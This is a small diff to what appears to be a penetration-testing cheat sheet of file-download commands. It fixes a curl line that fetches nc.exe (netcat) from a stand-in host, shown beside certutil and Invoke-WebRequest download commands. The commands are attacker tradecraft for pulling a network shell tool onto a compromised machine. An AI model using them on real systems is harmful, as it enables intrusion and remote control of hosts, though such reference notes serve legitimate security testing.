@@ -20,7 +20,7 @@ certutil -urlcache -f -split <target>
 
 Invoke-WebRequest <target> -OutFile <Path>
 
-curl -o http://example.com/nc.exe -o nc.exe
+curl http://example.com/nc.exe -o nc.exe
 ```
 
 ---
